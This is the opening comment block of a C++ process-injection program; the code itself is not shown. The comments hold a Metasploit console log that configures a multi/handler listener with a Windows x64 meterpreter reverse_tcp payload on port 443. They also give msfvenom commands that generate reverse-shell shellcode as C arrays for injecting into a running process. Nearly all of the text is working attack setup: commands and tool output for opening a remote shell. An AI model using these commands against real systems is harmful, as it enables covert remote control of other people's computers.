// ProcessInjection_01.cpp : This file contains the 'main' function. Program execution begins and ends there.// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY
// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY

/* TO RUN REVERSE HOST USE META SPLOIT
[-] Msf::OptionValidateError One or more options failed to validate : LHOST.
[*] Exploit completed, but no session was created.
msf6 exploit(multi / handler) > set lhost wlan1
lhost = > wlan1
msf6 exploit(multi / handler) > let lport 443
[-] Unknown command : let.Did you mean set ? Run the help command for more details.
msf6 exploit(multi / handler) > set lport 443
lport = > 443
msf6 exploit(multi / handler) > set payload windows / x64 / meterpreter / reverse_tcp
payload = > windows / x64 / meterpreter / reverse_tcp
msf6 exploit(multi / handler) > run - j

ONCE EXPLOIT IS LOADED:
sessions -i (in metasploit)


*/
//* TO COMPILE REVERSE SHELL, FOR INJECTION: USE msfvenom
//... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
//  msfvenom --platform windows -a x86 -p payload/windows/custom/reverse_named_pipe LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke003
/* Init*/

